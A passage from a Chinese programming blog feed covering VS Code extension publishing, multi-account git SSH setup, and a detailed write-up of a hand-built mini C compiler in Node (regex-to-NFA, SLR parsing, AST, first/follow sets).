powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> myExtension<br><span class="hljs-variable">$</span> vsce package<br><span class="hljs-comment"># 生成 myExtension.vsix,这时候本地可以看到一些二进制插件文件</span><br><span class="hljs-variable">$</span> vsce publish<br><br></code></pre></td></tr></table></figure><p>如果以前没有 vscode 插件市场的账户需要注册https://code.visualstudio.com/api/working-with-extensions/publishing-extension注册完之后，记得本地保存下密钥，因为会经常用的</p><p>取消发布的插件： vsce unpublish -p 密钥 包 id 包 id 可以在 vscode的对应插件的信息里可以看到，(一般点击插件的设置图标就可以看到包 id选项)</p><p>TextMate 语法最好对正则比较熟悉 具体的详细资料：https://code.visualstudio.com/api/language-extensions/semantic-highlight-guide#semantic-token-scope-map</p><p>https://macromates.com/manual/en/language_grammars#naming-conventions（TextMate语法规则）https://macromates.com/manual/en/regular_expressions（相关正则）</p><h3 id="项目踩坑点">项目踩坑点</h3><ol type="1"><li>我本地全局和项目下都是安装了 ts-nodede1，但是通过 npm runts-node，就是起不起来：Cannot find module'typescript'，后来在https://github.com/TypeStrong/ts-node/issues/707，好像是版本的问题，找到了最好的解决方案：npm linktypescript，再运行即可</li></ol><h3 id="项目难点">项目难点</h3><p>其实整个项目是在学习斯坦福编译原理的时候有顺便一起写的，写下来也挺累的，因为已经在工作了，在编写本项目前，也看了下斯坦福的cool 源码，然后了解了下 bison 和flex，顺便对照了了下虎书的伪代码，下面总结下一些比较重要或者困难的点：</p><ol type="1"><li><p>正则表达式部分，这一部分纯粹自己手写，代码设计可能看着有点邋遢，主要思想是借鉴虎书上的，虎书只画了几个图，也没有给伪代码，主要是怎么设计nfa的节点相关数据结构存储，一个是是用简单的链表，后面发现可能存在出度为多个的节点，就换用邻接表存储了，每个节点的信息包含了所有入度边的信息；其次正则表达式分析这里用的也是stack 对正则表达式进行分析，栈内的元素可能是节点也可能是字符串，在每次pop的时候需要注意对当前出栈的节点进行遍历拿到头尾节点，方便节点之间的连接。然后是将各个nfa 联合成一个大 nfa 的过程，采用 dfa + bfa + 备忘录 + 回溯；最好是将nfa =&gt; dfa 的过程，这一部分参照伪代码的，应该没啥大问题；</p></li><li><p>ast 生成部分：这一步文法分析表生成是参照伪代码的，后面的 ast生成过程是纯手写，其实在实现的过程中，也发现整个过程和 bison 的 yy文件如出一辙，不知道 bison 是怎么实现的 😯，本来是想弄成简单的 bison文件编写文法规则的，但是时间不允许，后面再抽空看下。ast生成这一部分主要是在规约动作上放置一些用户定义动作，这里就是写死的生成对应文法表达式的类，自底向上构建ast</p></li><li><p>这比一部分理论其实挺多的，但是在本项目里只要考虑周到即可，防止在编译的最好阶段报错，也是纯手写的</p></li><li><p>汇编生成部分：这一部分个人觉得最恶心了，因为汇编比较难调试，每次有bug都需要汇编语句一句一句看，其实回过头看，这样把元表达式（像+-<em>/赋值语句）的寄存器分配设计写好了，就可以拿它们组合成更大的原件。这里也是纯手写的，有一个比较困扰我的点，像if-else里面声明的变量如何在运行时候分配内存？我们都知道局部变量在不考虑用寄存器优化的情况下，一般都是存储在栈内的，像参数都是基于fp(栈指针)进行寻址的，比如形式参数 x,y，在生成汇编的时候就要记录，这里我拿数组的[x, y]，这样 x 的偏移量就是fp + 1 </em> 4, y 就是 fp + 2 * 4，但是像 if else里面的声明的变量只有运行到对应的分支才能分配内存，也就是说另一个没有执行的分支是不需要分配内存的。</p></li></ol><h3 id="参考文章">参考文章</h3><p><ahref="https://blog.csdn.net/qq_42977003/article/details/112341427">LL1文法、LR(0)文法、SLR文法、LR(1)文法、LALR文法_不积硅步的博客-CSDN博客</a></p><p><a href="https://zhuanlan.zhihu.com/p/77663680">栈和栈帧 - 知乎(zhihu.com)</a></p><p><ahref="https://www.cnblogs.com/henuliulei/p/10872483.html">LL(1),LR(0),SLR(1),LALR(1),LR(1)对比与分析- 你的雷哥 - 博客园 (cnblogs.com)</a></p><p><ahref="https://wangwangok.github.io/2020/05/05/bottom2top_syntax_parser_lalr/#:~:text=“规范LR”">语法分析——自底向上语法分析中的规范LR和LALR· 凌云壮志幾多愁 (wangwangok.github.io)</a></p>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础, node</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git多账号管理</title>
    <link href="/emocoder/2023/05/05/git%E5%A4%9A%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/"/>
    <url>/emocoder/2023/05/05/git%E5%A4%9A%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>为什么提交了代码并推送到github，但是github上的contributions并没有增加呢？</p><p>其中Github官方给出了一个官方文件，告诉我们什么样的Commit可以被记入Contribution，请点击此处查看。</p><p>在官方的帮助文档中，有一条是Commit被记入Contribution中必须满足用于Commit的邮件地址必须与Github账户相关联。其实，这也是为什么我的Commit没有被记入Contribution和不显示头像的原因，也是大多数人也是这个原因</p><p>https://docs.github.com/en/account-and-profile/setting-up-and-managing-your-github-profile/managing-contribution-settings-on-your-profile/why-are-my-contributions-not-showing-up-on-my-profile</p><p>我遇到的问题的解决方案是：该仓库的本地的邮箱和github账户的邮箱不是同一个配置：可以修改本地仓库的邮箱和github上一致：git config --local user.name 张三 git config --local user.emailzhansan@996icu.com</p><p>如果拿到一台公司电脑, 那么就请按照下面的最佳实践配置下git的多环境:请先执行命令打开配置文件 vi ~/.ssh/config</p><p>然后输入以下内容： # gitlab Host gitlab User git HostNamegitlab.company.com PreferredAuthentications publickey IdentityFile~/.ssh/gitlab_rsa ServerAliveInterval 300 ServerAliveCountMax 10 #github Host github User git HostName github.com PreferredAuthenticationspublickey IdentityFile ~/.ssh/github_rsa ServerAliveInterval 300ServerAliveCountMax 10</p><p>这里唯一需要替换的gitlab里的HostName部分, 改成你们公司的git地址.</p><p>遇到GitHub报permission denied错就执行：ssh-add -k ~/.ssh/github_rsa遇到gitlab报permission denied错就执行：ssh-add -k ~/.ssh/gitlab_rsa</p><p>推荐阅读：https://zhuanlan.zhihu.com/p/62071906</p>]]></content>
    
    
    <categories>
      
      <category>git/github</category>
      
    </categories>
    
    
    <tags>
      
      <tag>github, git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/emocoder/2023/05/05/minic/"/>
    <url>/emocoder/2023/05/05/minic/</url>
    
    <content type="html"><![CDATA[<h1 id="node-手写编译器-minicompiler">node 手写编译器-minicompiler</h1><p>使用语言：node, C++本文涉及：编译器的词法分析，抽象语义树生成，语法分析，代码生成本文重点内容：</p><ol type="1"><li>实现正则表达式分析器</li><li>实现简易版 Flex</li><li>实现 LR0 语法，并简单介绍其他语法(LL, LR1, SLR, LSPR)</li><li>实现简易版 Bison</li><li>实现生成汇编代码</li><li>实现简易编译器功能，提供编译时期类型检查和推断，支持加减乘除支持函数的递归调用，以及</li></ol><p>会包含的：</p><ol type="1"><li>实现 nfa，以及联合 nfa =&gt; dfa，进行词法分析</li><li>实现 dfa，进行语法分析，并基于此构建抽象语法树(AST)</li><li>基于 ast 进行语言义分析(类型检查以及是否符合语言规范)</li><li>基于 ast生成汇编代码，虽然本文没有显示的终中间代码生成过程，但是也有类似的思想</li></ol><p>不会包含的：本语言比较简单，不包含复杂数据结构的支持，如数组对象等其他功能；不会涉及复杂的编译器后端知识：如垃圾回收，寄存器染色，数据流分析等等</p><p>minic 语法：</p><ol type="1"><li>运算符：支持+-*/运算，不支持优先级(, )</li><li>类型：支持自然数(int 类型)，字符串，布尔值以及 void</li><li>语句：支持函数调用，嵌套的 if-else语句（if-else必须成对出现，如下的语法是不允许的）</li><li>和 C 一样，必须要有 main 函数</li><li>变量必须声明的时候同时赋值，如下的声明是不允许的</li><li>允许块级作用域</li><li>允许返回值是条件表达式，运算表达式</li><li>运算符左右两侧仅可以是变量或是数字</li></ol><h2 id="一minic-语法">一、minic 语法：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>  <span class="hljs-keyword">return</span> x + y;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">feb</span><span class="hljs-params">(x: <span class="hljs-type">int</span>)</span> &#123;<br>  <span class="hljs-keyword">if</span> (x == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> x;<br>  &#125;<br>  <span class="hljs-keyword">return</span> x + feb(x<span class="hljs-number">-1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>下面我会从以下四个方面依次入手：</p><ol><li>parser</li><pre><code class="hljs">&lt;ul&gt;&lt;li&gt;正则&lt;/li&gt;&lt;li&gt;todo&lt;/li&gt;&lt;/ul&gt;</code></pre><li>sematic</li><ul><li>slr</li><li>语义分析</li><li>todo</li></ul><li>代码生成</li><li>可视化</li><h2 id="二parser">二、parser</h2><p>在词法分析阶段，输入是字符串，输出是 token 流，这里 token流有一个坑，一开始我的输出是枚举值的数组，类似这样:<code>[TYPE, ID, BRACE, ...]</code>，但是这样会有问题，因为词素值没办法保留下来，所以后面改成了如下输出:<code>[(line_num, TYPE, int), (line_num, ID, feb)]</code>，(行号，类型,词素值)三元组 学过编译原理都知道，需要有自动机把输入流，转成一个个token，比如当词法分析器读完 int 的时候，这时候就会返回一个 TYPEtoken，但是如果是 int1，就应该返回一个 IDtoken，所以这里涉及到贪婪读取，另外对于像 if这种关键字，如果同时满足多种终结状态，应该涉及到优先级</p><p>那么如何构建自动机？ 首先我们的目标是对每种特定的 token设置对应的正则表达式，并生成对应的 dfa，用过 flex的同学应该都知道，比如：</p><p>然后我们把这些 dfa 构建为一个大的 nfa，再把 nfa 转为 dfa</p><p>我们的词法分析器支持以下几个单元： +: a+, ?: a?, <em>: a</em>, 连接:ab， 逻辑或: a|b， 字符集: [a-z] 支持少部分字符转义：, t, </p><p>如何把正则表达式构建为dfa：对于每一个单元正则表达式，可以直接生成对应的节点，但是有些问题我们需要注意：我们的输入是一个个正则表达式，正则表达式本身可以理解为是一个个单元，而这些单元又可能是字符或者其他单元和成的，如：a|b 就是一个单元，但是其组成就是 2 个字符 [a-z]|a就是一个单元+一个普通字符另外对于中括号这种还需要特殊处理，思路如下：即使是字符也会抽象成节点的概念，另外在生成自动机的过程中，由于存在[]，+，*等等这样的修饰符号，考虑使用stack 进行存储，一般的，形式化如下：对于正则表达式 xxxxx 其中 X为可能的任意字符，<code>stack = []</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">i = <span class="hljs-number">0</span><br>pattern = <span class="hljs-string">&#x27;XXXX&#x27;</span><br><span class="hljs-keyword">while</span> (i &lt; len(pattern)) &#123;<br>  <span class="hljs-keyword">auto</span> node = getNode(pattern[i]);<br>  <span class="hljs-built_in">stack</span>.push(node);<br>&#125;<br><br>node <span class="hljs-title function_">getNode</span><span class="hljs-params">(<span class="hljs-built_in">string</span> s)</span> &#123;<br>  <span class="hljs-keyword">if</span> (s === <span class="hljs-string">&#x27;]&#x27;</span>)<br>  <span class="hljs-keyword">if</span> (s === <span class="hljs-string">&#x27;+&#x27;</span>)<br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 getNode函数做的事请就是识别特定的符号，然后用对应的正则表达式函数生成即可，比如对于特殊的符号:[],需要收集其包含的字符集，然后构建一个如图的基本正则单元；再比如a+，我们需要从 stack 内 pop 出一个元素，生成对应的基本正则单元。</p><p>最后，所有的特殊符号处理完成，也就意味着栈内只有正则表达式单元这种数据结构，这些节点之间没有任何修饰符(因为修饰符之前都被处理完了，除了连接运算)，然后我们依次连接这些节点即可，另外对于每个正则的叶子节点确定，即当前栈顶元素的最后一个节点(因为栈顶元素对应正则的末尾)。</p><p>我们可以提供相应的函数，我们的词法分析器包含以下几种基本正则单元：</p><ol type="1"><li>连接运算符</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs node">export function connect(from: VertexNode, to: VertexNode): VertexNode &#123;<br>  // from的尾和to的头相互连接,注意circle<br>  let cur = graph.getVertex(from.index); // 获取邻接表<br>  const memo: number[] = [];<br>  while (cur.firstEdge &amp;&amp; !memo.includes(cur.index)) &#123;<br>    memo.push(cur.index);<br>    cur = graph.getVertex(cur.firstEdge.index);<br>  &#125;<br><br>  graph.getVertex(cur.index).firstEdge = new Node(<br>    to.index,<br>    graph.getVertex(cur.index).firstEdge<br>  );<br>  return from;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2" type="1"><li>逻辑或</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs node">export function or(a: VertexNode, b: VertexNode): VertexNode &#123;<br>  const nodeStart = new VertexNode(Graph.node_id, null);<br>  graph.addVertexNode(nodeStart, nodeStart.index);<br>  nodeStart.firstEdge = new Node(a.index, null, a.edgeVal || null);<br>  nodeStart.firstEdge.next = new Node(b.index, null, b.edgeVal || null);<br>  const nodeEnd = new VertexNode(Graph.node_id, null);<br>  graph.addVertexNode(nodeEnd, nodeEnd.index);<br>  connect(a, nodeEnd);<br>  connect(b, nodeEnd);<br>  return nodeStart;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3" type="1"><li>字符集</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs node">export function characters(chars: string[]) &#123;<br>  const nodeStart = new VertexNode(Graph.node_id, null);<br>  graph.addVertexNode(nodeStart, nodeStart.index);<br>  const nodeEnd = new Node(Graph.node_id, null, chars);<br>  const tmp = new VertexNode(nodeEnd.index, chars);<br>  graph.addVertexNode(tmp, tmp.index);<br><br>  const pre = nodeStart.firstEdge;<br>  nodeStart.firstEdge = nodeEnd;<br>  nodeEnd.next = pre;<br><br>  return nodeStart;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="4" type="1"><li>*修饰符</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs node">export function mutipliy(wrapped: VertexNode): VertexNode &#123;<br>  const nodeStart = new VertexNode(Graph.node_id, null);<br>  graph.addVertexNode(nodeStart, nodeStart.index);<br>  const tmp = new Node(wrapped.index, null, null);<br>  nodeStart.firstEdge = tmp;<br>  let cur = graph.getVertex(wrapped.index); // 获取邻接表<br>  while (cur.firstEdge) &#123;<br>    cur = graph.getVertex(cur.firstEdge.index);<br>  &#125;<br>  connect(cur, nodeStart);<br>  return nodeStart;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="5" type="1"><li>+修饰符</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs node">export function plus(base: VertexNode) &#123;<br>  // 基于old新建节点<br>  let nodeStart = new VertexNode(Graph.node_id, base.edgeVal);<br>  nodeStart.firstEdge = base.firstEdge;<br>  const res = nodeStart;<br>  graph.addVertexNode(nodeStart, nodeStart.index);<br>  let cur = base?.firstEdge;<br>  while (cur) &#123;<br>    const vertexNode = graph.getVertex(cur?.index);<br>    const tmp = new VertexNode(Graph.node_id, vertexNode.edgeVal);<br>    nodeStart.firstEdge = new Node(tmp.index, null, vertexNode.edgeVal);<br>    nodeStart = tmp;<br>    tmp.firstEdge = base.firstEdge;<br>    graph.addVertexNode(tmp, tmp.index);<br>    cur = vertexNode.firstEdge;<br>  &#125;<br>  return mutipliy(res);<br>&#125;<br></code></pre></td></tr></table></figure><p>不过比较困扰的是这些节点的数据结构如何存储是一件要考虑周到的事：需要节点id，由于自动机是有向图，并且可能带环，并且节点和节点之间可能存在不止一条边，考虑了下，还是用linjie表存储(主要是第一版的代码是这样的，再加上如果感觉节点之间的连接可能在某些情况下比较少，临界矩阵比较浪费内存)，firstEdge指向其所有的临界边，edgeVal 是边上的值，对于该图的搜索，使用bfs+dfs+检测环。 通过以上流程，我们得到了一个 nfa，由该 nfa可以得到各个节点的边，以及叶子节点(并且叶子节点上放置了相应的动作)</p><p>nfa =&gt; dfa:这一步使用的是虎书上的算法，这里不过多描述，简单来说就是把很多个大的 nfa联合构建成一个 dfa 从而得到一张状态转移表</p><h2 id="三构建抽象语法树">三、构建抽象语法树</h2><p>这里我用的是简单的LR(0)上下无关文法，关于什么是上下无关文什么是有关文，请戳-&gt;,理论上上下无关文法LR(1) &gt; LSPR &gt; SLR &gt; LR(0) LR(0): 没有提前预测的符号，容易出现shift-reduce 冲突以及 reduce-reduce 冲突，所以需要设计适合的文法； SLR:有简单的预测，可以解决 shift-reduce 冲突，但是无法解决 reduce-reduce冲突 LR(1): 可以解决 shift-reduce 冲突，也解决 reduce-reduce 冲突 LSPR:由于 LR(1)的表特别大，在此基础上做了优化</p><p>根据相应文法生成 ast，本质上是利用栈和 nfa，看如下文法的LR(0)生成过程： E-&gt; Program $ Program -&gt; Assign == Assign Assign-&gt; Assign + Token Assign -&gt; Token Token -&gt; id</p><p>LR(0)dfa</p><p><img src="../飞书20230430-125517.jpg" /></p><p>LR(0)对应的状态转移表： <img src="../飞书20230430-124728.jpg" /></p><p>可以看到在状态 9 是存在移位-规约冲突的，这是因为LR(0)默认在所有的终结符号处做规约，slr 语法是比LR(0),更为广泛的一种语法，它只在特定的地方放置规约动作。具体来说，在上面的例子里，在状态9 处，只有规约式 1 的移位指针到达里末尾，所以可以看下规约式 1后面可能会紧接着什么符号，也就是 followSet(Program) ={$}，所以只在$处放置规约动作。 下面是 slr 分析表： <imgsrc="../飞书20230430-163301.jpg" /></p><p>有了这张表就可以基于输入(一般是 token流)去做语法分析了，刷过算法题的都应该猜到了会用栈来作为数据结果，是的，每一次自底向上规约都可以看作是栈的pop动作，并且在这次动作中可以做很多事情，比如生成我们想要的树节点，如：</p><p>在设计 AST 结构的同时需要同时兼顾到 AST的结构方便语义分析和代码生成，该语言的 ast 结构大致如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs node">Program_Class &#123;<br>  expr: Function_Class &#123;<br>    formal_list: [ &#x27;x&#x27; ],<br>    name: &#x27;total&#x27;,<br>    expressions: Branch_Class &#123;<br>      ifCond: Cond_Class &#123;<br>        lExpr: Indentifier_Class &#123; token: &#x27;x&#x27; &#125;,<br>        rExpr: Int_Contant_Class &#123; token: &#x27;0&#x27; &#125;,<br>        op: &#x27;==&#x27;<br>      &#125;,<br>      statementTrue: Return_Class &#123; expr: Indentifier_Class &#123; token: &#x27;x&#x27; &#125; &#125;,<br>      statementFalse: Assign_Class &#123;<br>        name: &#x27;m&#x27;,<br>        ltype: &#x27;int&#x27;,<br>        r: Caller_Class &#123;<br>          params_list: [ undefined ],<br>          id: &#x27;total&#x27;,<br>          params: Sub_Class &#123;<br>            lvalue: Indentifier_Class &#123; token: &#x27;x&#x27; &#125;,<br>            rvalue: Int_Contant_Class &#123; token: &#x27;1&#x27; &#125;<br>          &#125;,<br>          next: undefined<br>        &#125;,<br>        next: Return_Class &#123;<br>          expr: Add_Class &#123;<br>            lvalue: Indentifier_Class &#123; token: &#x27;x&#x27; &#125;,<br>            rvalue: Indentifier_Class &#123; token: &#x27;m&#x27; &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;,<br>    formals: Formal_Class &#123; name: &#x27;x&#x27;, type: &#x27;int&#x27;, next: undefined &#125;,<br>    next: Function_Class &#123;<br>      formal_list: [ &#x27;x&#x27;, &#x27;y&#x27; ],<br>      name: &#x27;sum&#x27;,<br>      expressions: Return_Class &#123;<br>        expr: Add_Class &#123;<br>          lvalue: Indentifier_Class &#123; token: &#x27;x&#x27; &#125;,<br>          rvalue: Indentifier_Class &#123; token: &#x27;y&#x27; &#125;<br>        &#125;<br>      &#125;,<br>      formals: Formal_Class &#123;<br>        name: &#x27;y&#x27;,<br>        type: &#x27;int&#x27;,<br>        next: Formal_Class &#123; name: &#x27;x&#x27;, type: &#x27;int&#x27;, next: undefined &#125;<br>      &#125;,<br>      next: Function_Class &#123;<br>        formal_list: [],<br>        name: &#x27;main&#x27;,<br>        expressions: Assign_Class &#123;<br>          name: &#x27;x&#x27;,<br>          ltype: &#x27;int&#x27;,<br>          r: Caller_Class &#123;<br>            params_list: [ &#x27;10&#x27; ],<br>            id: &#x27;total&#x27;,<br>            params: Int_Contant_Class &#123; token: &#x27;10&#x27; &#125;,<br>            next: undefined<br>          &#125;,<br>          next: Caller_Class &#123;<br>            params_list: [ &#x27;x&#x27; ],<br>            id: &#x27;print&#x27;,<br>            params: Indentifier_Class &#123; token: &#x27;x&#x27; &#125;,<br>            next: undefined<br>          &#125;<br>        &#125;,<br>        formals: undefined,<br>        next: undefined,<br>        return_type: &#x27;int&#x27;<br>      &#125;,<br>      return_type: &#x27;int&#x27;<br>    &#125;,<br>    return_type: &#x27;int&#x27;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其树节点是各种表达式类，源码在 tree.ts 文件里，</p><p>follow集和first集生成： follow集： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs node">_processFollow(_nts: string) &#123;<br>  // 3 若存在一个表达式 X -&gt; ABCD 则 Follow(A) 需要加上 First(B) - ε，若First(B) 包含 ε，则Follow(A) 需要加上 First(C) - ε，向右迭代... 迭代至表达式结束。<br>  for (const nts of this.nonTerminalSymbol) &#123;<br>    for (let grammarArr of this.lfh2rfh.get(nts)) &#123;<br>    <br>      const len = grammarArr.value.length;<br>      let index = -1;<br>      // 找到 B<br>      for (let i = 0; i &lt; len; i += 1) &#123;<br>        const ch = grammarArr.value[i];<br>        if (ch === _nts) &#123;<br>          index = i;<br>          break;<br>        &#125;<br>      &#125;<br>      if (index === -1) continue;<br>      while (index + 1 &lt; len) &#123;<br>        const ch = grammarArr.value[index + 1];<br>        if (this.terminalSymbol.has(ch)) &#123;<br>          // 终结符直接加入<br>          this._followSet[_nts].add(ch);<br>          break;<br>        &#125; else &#123;<br>          const set = this._firstSet[ch];<br>          for (const v of Array.from(set || []))<br>            if (v !== EMPTY) this._followSet[_nts].add(v);<br>          if (!set?.has(EMPTY)) break;<br>          index += 1;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><br>startBuildFollowSet() &#123;<br>  for (let nts of this.nonTerminalSymbol) &#123;<br>    this._followSet[nts] = new Set();<br>  &#125;<br>  this._followSet[START].add(END);<br>  while (true) &#123;<br>    let flag = false;<br>    for (let nts of this.nonTerminalSymbol) &#123;<br>      this._processFollow(nts);<br>      if (isEqual(prevFollowSet, this._followSet)) flag = true;<br>      else flag = false;<br>      prevFollowSet = cloneDeep(this._followSet);<br>    &#125;<br>    if (flag) break;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs node">// 求firset集这里做了点改动，一般需要手动消除左递归文法，这里在代码里如果遇到了左递归直接结束<br>_processFirst(nts: string, memo: Set&lt;string&gt;) &#123;<br>  memo.add(nts);<br>  for (const grammarArr of this.lfh2rfh.get(nts)) &#123;<br>    const len = grammarArr.value.length;<br>    for (let i = 0; i &lt; len; i += 1) &#123;<br>      const ch = grammarArr.value[i];<br>      if (this.terminalSymbol.has(ch)) &#123;<br>        this._firstSet[nts].add(ch);<br>        break;<br>      &#125; else &#123;<br>        if (i === 0 &amp;&amp; ch === nts) &#123;<br>          // 避免左递归<br>          break;<br>        &#125;<br>        if (memo.has(ch)) &#123;<br>          // 避免循环递归<br>          break;<br>        &#125;<br>        <br>        this._processFirst(ch, memo);<br>        for (const v of this._firstSet[ch]) this._firstSet[nts].add(v);<br>        if (!this._firstSet[ch].has(EMPTY)) break;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br>startuildFirstSet() &#123;<br>  for (let nts of this.nonTerminalSymbol) this._firstSet[nts] = new Set();<br>  for (let nts of this.nonTerminalSymbol) &#123;<br>    const memo = new Set([]);<br>    this._processFirst(nts, memo);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 